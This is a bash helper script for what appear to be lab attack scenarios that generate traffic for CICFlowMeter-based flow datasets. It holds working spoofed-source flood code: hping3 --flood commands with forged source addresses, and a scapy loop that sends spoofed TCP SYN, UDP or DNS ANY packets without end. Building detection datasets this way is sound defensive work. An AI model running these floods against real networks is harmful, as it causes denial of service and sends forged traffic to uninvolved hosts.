#!/bin/bash
# Shared helpers for the attack scenarios.

DURATION="${DURATION:-600}"

pids=()

launch() {
  local label=$1; shift
  echo "  launching ${label}: $*"
  "$@" >/dev/null 2>&1 &
  pids+=($!)
}

launch_quiet() {
  "$@" >/dev/null 2>&1 &
  pids+=($!)
}

stop_all() {
  for pid in "${pids[@]}"; do kill "$pid" 2>/dev/null || true; done
}

finish() {
  echo "running for ${DURATION}s..."
  sleep "${DURATION}"
  echo "stopping"
  stop_all
  wait 2>/dev/null || true
  echo "done"
}

need() {
  command -v "$1" >/dev/null || {
    echo "missing $1 - run attacks/install-tools.sh" >&2
    exit 1
  }
}

# A --flood walks the source port space, so each 5-tuple can end up carrying a
# single packet, and CICFlowMeter drops flows of one packet. These streams keep
# one source port each and send at hping3's own rate, so the flows both survive
# conversion and carry the packet rate a volumetric flood actually has.
launch_spoofed_flows() {
  local src=$1 dst=$2 dport=$3 proto=${4:-udp} zone=${5:-cyberstuff.local}
  local streams="${SPOOF_STREAMS:-16}"
  local payload="${SPOOF_PAYLOAD:-512}"
  local baseport="${SPOOF_BASEPORT:-41000}"

  if command -v hping3 >/dev/null; then
    local mode="-2"
    [ "${proto}" = "tcp" ] && mode="-S"
    echo "  launching ${streams} spoofed ${proto} flows from ${src} (${payload}B payload)"
    local i
    for i in $(seq 0 $((streams - 1))); do
      launch_quiet hping3 -a "${src}" ${mode} --keep -s $((baseport + i)) \
                   -p "${dport}" -d "${payload}" --flood "${dst}"
    done
    return 0
  fi

  if ! python3 -c "import scapy" 2>/dev/null; then
    echo "  neither hping3 nor scapy present, skipping the spoofed flow stream"
    return 0
  fi

  launch "spoofed ${proto} flows from ${src}" python3 -c "
from scapy.all import IP, TCP, UDP, DNS, DNSQR, Raw, send

payload = Raw(b'A' * ${payload}) if ${payload} else None

def build(port):
    ip = IP(src='${src}', dst='${dst}')
    if '${proto}' == 'tcp':
        pkt = ip / TCP(sport=port, dport=${dport}, flags='S')
    else:
        pkt = ip / UDP(sport=port, dport=${dport})
        if ${dport} == 53:
            pkt = pkt / DNS(rd=1, qd=DNSQR(qname='${zone}', qtype='ANY'))
    return pkt / payload if payload else pkt

while True:
    for port in range(${baseport}, ${baseport} + ${streams}):
        send([build(port)] * 32, verbose=0)
"
}

trap 'stop_all' INT TERM
